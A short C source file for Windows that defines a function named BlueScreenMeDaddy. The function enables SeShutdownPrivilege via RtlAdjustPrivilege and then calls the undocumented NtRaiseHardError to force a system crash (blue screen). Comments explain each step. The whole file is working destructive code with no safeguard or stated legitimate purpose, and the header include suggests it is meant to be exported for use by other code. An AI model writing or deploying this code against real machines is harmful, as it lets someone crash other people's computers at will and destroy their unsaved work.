#include "export.h"
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);

typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void BlueScreenMeDaddy()
{
  LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
  if (!lpFuncAddress)
  {
    return;
  }

  BOOLEAN bEnabled;
  pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
  NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); // Enable SeShutdownPrivilege via RtlAdjustPrivilege

                                                                        // here you can check if NtRet == 0x00000000 (STATUS_SUCCESS) if you want
  LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError"); // GetModuleHandle as ntdll.dll was loaded earlier with first GetProcAddress function use
  if (!lpFuncAddress2)
  {
    return;
  }

  ULONG uResp;
  pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
  NTSTATUS NtRet2 = NtCall2(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &uResp); // cause the BSoD crash
  return;
}